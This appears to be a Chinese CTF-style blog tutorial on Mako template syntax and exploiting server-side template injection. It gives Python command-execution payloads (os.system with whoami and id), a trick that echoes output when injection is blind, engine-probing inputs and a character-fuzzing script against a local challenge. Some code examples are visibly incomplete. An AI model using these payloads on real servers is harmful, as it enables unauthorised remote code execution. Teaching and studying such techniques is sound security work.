上一篇我们介绍了Flask模块下的模板注入漏洞，今天就来讲一讲Mako模板引擎：
## Mako模板基础：
我们还是先进行一下Mako模板的介绍，其相关的语法和用法，在Mako 是 Pylons 的默认模板语言，就好比 jinja2 和 flask 的关系类似。
### 基础语法
  * 变量取值：
        ${ }：输入 `1+1`，`字符串`，`方法`，都会有执行结果
    显示变量temp的值：${temp}
    变量temp乘2：${temp*2}
    变量temp的平方：${pow(temp,2)}
  * 2、转义符
在定义变量时，如果其中包含特殊符号时记得要使用转义符转换。u负责转换URL地址，h转换HTML，x对XML进行转义，trim就是去空格啦。
        url: ${"there is some text"}
    url(with escaping): ${"there is some text" | u}
    执行：
    url: there is some text
    url(with escaping): there+is+some+text##空格被解析为+号
        html: ${"show "}
    html(with escaping): ${"show " | h}
    执行：
    html: show 
    html(with escaping): show &lt;table&gt;##<>被成功转义
  * 控制结构：
        %for ... : %endfor
    %if ... : ... %elif: ... % else: ... %endif
  * Python 代码块：
  * 导入模块：
  * 定义函数：
        ` ... `，调用：`${...()}`
  * 注释：
        ##（单行）、（多行）
  * 其他：
        继承模板：
    包含模板：，
    引用：
==可以看到上面非常依赖 `%`，如果非要用到 `%`，需要写成 `%%`==
对于常用的语法，看一个例子就懂了：
    from mako.template import Template
    tp = Template('''## 这是一个注释
    % for i in my_range(c)+a:
        %if i % 2:
            ${ i }
        %endif
    % endfor
    ''')
    print(tp.render(a = [5, 6, 7, 8, 9]))
我们来解释一下这个代码的含义：
在Mako模板语言创建一个模板，在模板中定义一个名为my_range的函数，该函数接受一个参数n，返回一个由0到n-1的整数列表，这是整个代码的核心机制
这里定义n为c，c=5，`my_range(c)+a`：把a放入my_range函数所返回的整数列表中，my_range返回1，2，3，4，将a放入，整个整数列表就是1-9，然后for循环，i%2返回值只要非零，就输出，即输出所有的奇数：
    % for i in my_range(c)+a:
        %if i % 2:
            ${ i }
        %endif
    % endfor
执行结果：
    1，3，5，7，9
### 过滤器：
上一篇Flask模块下，在ssti绕过中我们提到了attr，他就是jinja2中的过滤器，而Mako过滤器引用更加方便：
单个过滤器的使用和 jinja2 一样很像，都是用 `|` 来引用。如果要使用多个过滤器，mako 需要用 `,` 来指定：
    ${" some value " | h,trim}
要定义自己的过滤器也比较简单，不需要和 jinj2 一样操作 `environment`，只需要定义一个函数即可使用：
    " + text + ""
    %>
    Here's some tagged text: ${"text" | myescape}
    Here's some tagged text: ${"text" | myfilters.myescape}##多个连续引用
## Mako模板漏洞：
### 常规bypass：
因为Mako模板下完全支持python代码的执行，所以我们不必要去和Flask下jinja2一样去寻找类然后再去调用，可以直接注入python的攻击代码。所以jinja2的利用方法，基本Mako这都能利用，且更简单。
详细的攻击方式请看对应链接，这里就不再水文字了……
例：
直接调用os模块，执行whoami命令。
    # 或者
    # 或者
    ${__import__("os").system("whoami")}
### 无回显（特殊变量引用）：
mako 引入了新的默认变量：
    In [57]: Template("${ locals() }").render()
    Out[57]: """
    {
      'context': ,
      'pageargs': {},
      '__M_caller': None,
      '__M_locals': {
        'pageargs': {}
      },
      'locals': , 
      '__M_writer': 
    }
    """
这段代码的含义是：
    使用Mako模板引擎，将locals（）函数的结果渲染为字符串。locals（）函数返回一个字典，其中包含当前上下文中的本地变量，如上下文，参数，调用者，本地变量和写入器。
如果在遇到无回显的场景，就可以调用local函数下的 `__M_writer`、`context.write` 进行打印。
例如：
    from mako.template import Template
    tp = Template('''
    %for i in x:
      "a"
    %endfor
    ''')
    print(tp.render())
  * 其中 x 是注入点。那么我们就可以用 `str(__M_writer(str(__import__("os").system("id"))))` 来实现回显。当然，盲注或者弹 shell 也是 ok 的。
  * 还有一种类型的利用 `context.kwargs` 来获取上下文环境中传递的值。例如一个 web 接口有用到 mako，且有一个参数 name，那么可以直接在模板中使用这个变量名，这个时候通常需要 eval 下。
## 确定Mako框架：
这里我们系统讲解一下在已知SSTI的情况下，漏洞究竟出现在什么模板引擎下。
看了一下是个提交框，我们提交什么返回什么，所以初步认定是SSTI，首先我们要知道python的模板模型，才能够确定我们的攻击方式。
### SSTI 的简单探测：
最常用的方法是通过注入模板表达式中常用的一系列特殊字符来尝试模糊模板 ————这也被称作 fuzz 测试，例如`${{ Hello Apce
因为会渲染成 HTML，所以这还可以导致 XSS 漏洞。但是模板引擎会自动执行数学运算，所以如果我们输入一个运算，例如
    http://vulnerable-website.com/?username=${7*7}
如果模板引擎最后返回 Hello 49 则说明存在 SSTI 漏洞。而且不同的模板引擎的数学运算的语法有些不同，还需要查阅相关资料的。
#### 二、代码上下文
以这样一段代码为例，同样是用来生成邮件的.
    greeting = getQueryParameter('greeting')
    engine.render("Hello {{"+greeting+"}}", data)
上面代码通过获取静态查询参数 greeting 的值然后再填充到模板语句中，但是就像 SQL
注入一样，如果我们提前将双花括号闭合，然后就可以注入自定义的语句了。
#### 三.确定 Web 界面所用的模板引擎:
  * 这也算是探测的一种吧，但是这种探测是基于已知 SSTI 漏洞存在的二次探测，一般的做法是触发报错。
触发报错的方式很多，这里以 Ruby 的 ERB 引擎为例，输入无效表达式``触发报错。可以得到如下报销信息
    (erb):1:in `': undefined local variable or method `foobar' for main:Object (NameError)
    from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval' 
    from /usr/lib/ruby/2.5.0/erb.rb:876:in `result' 
    from -e:4:in `'
  * 根据不同的报错得到不同的模板引擎
  * 有的时候相同的 payload 可能会有两种响应，比如`{{7*’7’}}`在 Twig 中会的到 49，而在 Jinja2 中会得到 7777777。
单字符fuzz测试：
    from time import sleep
    import requests
    import urllib
    from bs4 import BeautifulSoup
    url = "http://127.0.0.1:9999"
    for i in range(32, 127):
        html = chr(i)
        # print(html)
        data = {'html': html}
        # 会自动url编码，不需要手动编码
        r = requests.post(url=url + '/generate', data=data)
        soup = BeautifulSoup(r.content, 'lxml')
        if (soup.find_all('a')):
            item = soup.find_all('a')[0].get('href')[1:]
            # 注：有两个.不能直接replace
            # print(item)
            r2 = requests.get(url=url + item)
            # print(r2.url)
            # print(r.status_code)
            with open('1.txt', 'a+') as f:
                f.write(html + ":" + str(r2.status_code) + "\n" + r2.text + "\n")
                print(str(i))
                f.close()
        else:
            with open('1.txt', 'a+') as f:
                f.write(html + ":" + r.text + "\n")
                print(str(i))
                f.close()
        # sleep(2)
对这个题进行了fuzz之后发现过滤了如下字符：
    %>  />  _  +  $  [  '  "
    chr  ord  hex  eval  exce
    "
    $
    '
    *
    +
    -    /
    [
    ]
    _
因为Mako可以直接利用python的代码来执行，用Mako循环语法测试。结果渲染了3个1，证明确实是mako框架。
    %for a in (1,2,3):
    1
    %endfor
## 沙箱机制：
让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python
代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数。Python